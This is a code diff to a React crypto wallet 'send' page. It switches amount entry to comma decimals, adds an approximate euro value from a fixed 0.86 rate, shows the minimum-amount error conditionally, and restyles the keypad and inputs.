@@ -138,6 +138,7 @@ export default function WalletPage() {
       if (amountParam) {
         setAdminAmount(amountParam);
         setActualAmount(amountParam);
+        setDisplayAmount(amountParam.replace(".", ","));
       }
       if (tokenParam === "usdt" || tokenParam === "usdc") {
         setToken(tokenParam);
@@ -329,14 +330,20 @@ export default function WalletPage() {
     }
   };
 
+  const getFiatValue = (amountStr: string) => {
+    const parsed = parseFloat(amountStr.replace(",", "."));
+    if (isNaN(parsed)) return "0,00";
+    return (parsed * 0.86).toFixed(2).replace(".", ",");
+  };
+
   const handleKeyPress = (key: string) => {
     setDisplayAmount((prev) => {
       let newVal = prev;
       if (key === "⌫") {
         newVal = prev.slice(0, -1);
       } else if (key === "," || key === ".") {
-        if (!prev.includes(".")) {
-          newVal = prev === "" ? "0." : prev + ".";
+        if (!prev.includes(",") && !prev.includes(".")) {
+          newVal = prev === "" ? "0," : prev + ",";
         }
       } else {
         if (prev === "0") {
@@ -352,7 +359,7 @@ export default function WalletPage() {
   const handleMaxClick = (e: React.MouseEvent) => {
     e.stopPropagation();
     const maxVal = ethers.formatUnits(walletBalance, 6);
-    setDisplayAmount(maxVal);
+    setDisplayAmount(maxVal.replace(".", ","));
   };
 
   return (
@@ -361,7 +368,7 @@ export default function WalletPage() {
       onClick={() => setIsKeyboardVisible(false)}
     >
       <div className="form-container">
-        <label className="form-label">Address or Domain Name</label>
+        <label className="form-label">Address or domain name</label>
         <div className="input-row">
           <input
             type="text"
@@ -408,14 +415,13 @@ export default function WalletPage() {
 
         <div>
           <label className="form-label form-label--spaced">Amount</label>
-          <div className="montant-container" onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
-            <input
-              type="text"
-              value={displayAmount || "0"}
-              className="montant-input"
-              readOnly
-              inputMode="none"
-            />
+          <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
+            <div className="montant-input-wrapper">
+              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
+                {displayAmount || "0"}
+              </span>
+              {isKeyboardVisible && <span className="blinking-cursor" />}
+            </div>
             <div className="montant-right">
               {displayAmount !== "" && (
                 <button 
@@ -424,7 +430,7 @@ export default function WalletPage() {
                   onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}
                 >
                   <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                    <circle cx="12" cy="12" r="10" fill="#94a3b8" stroke="#94a3b8" />
+                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                     <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                     <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                   </svg>
@@ -436,13 +442,26 @@ export default function WalletPage() {
                 onClick={handleMaxClick} 
                 className="montant-max-btn"
               >
-                Max
+                Max.
               </button>
             </div>
           </div>
-          <div className="montant-error">
-            Minimum amount is 0.000001 {token.toUpperCase()}
-          </div>
+          {(() => {
+            const parsedVal = parseFloat(displayAmount.replace(",", "."));
+            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
+            if (isInvalid) {
+              return (
+                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
+                  Minimum amount is 0.000001 {token.toUpperCase()}
+                </div>
+              );
+            }
+            return (
+              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
+                ≈ €{getFiatValue(displayAmount)}
+              </div>
+            );
+          })()}
         </div>
       </div>
 
@@ -471,7 +490,6 @@ export default function WalletPage() {
         >
           <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key">
             <span className="keypad-key__number">1</span>
-            <span className="keypad-key__letters">&nbsp;</span>
           </button>
           <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key">
             <span className="keypad-key__number">2</span>
@@ -508,10 +526,10 @@ export default function WalletPage() {
             <span className="keypad-key__letters">WXYZ</span>
           </button>
 
-          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--no-letters">
-            <span className="keypad-key__number">,</span>
+          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
+            <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
           </button>
-          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key keypad-key--no-letters">
+          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key">
             <span className="keypad-key__number">0</span>
           </button>
           <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
